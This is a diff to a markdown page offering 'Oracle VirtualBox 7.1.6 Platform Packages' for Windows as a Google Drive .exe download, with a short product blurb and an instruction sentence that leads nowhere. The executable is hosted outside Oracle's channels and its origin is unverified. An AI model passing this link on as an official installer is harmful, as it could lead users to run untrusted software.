@@ -1,5 +1,10 @@
 # Oracle VirtualBox 7.1.6 Platform Packages for Windows Hosts
+
+VirtualBox is a general-purpose full virtualization software targeted at laptop, desktop, server and embedded use.
+
 [Oracle VirtualBox 7.1.6 Platform Packages for Windows Hosts.exe](https://drive.google.com/file/d/1b48V22QazDoHx0fjGJ0tn1BcyeZinDAs/view?usp=drive_link)
+
+As installation of Oracle VirtualBox varies depending on your host operating system, the following sections provide installation instructions for Windows hosts:
 
 ![image](https://github.com/user-attachments/assets/b6ec239a-1fe2-4d35-99d1-6144c0533d20)
 ![image](https://github.com/user-attachments/assets/0608fd3e-5d36-467f-b1cb-259739b3ecd5)
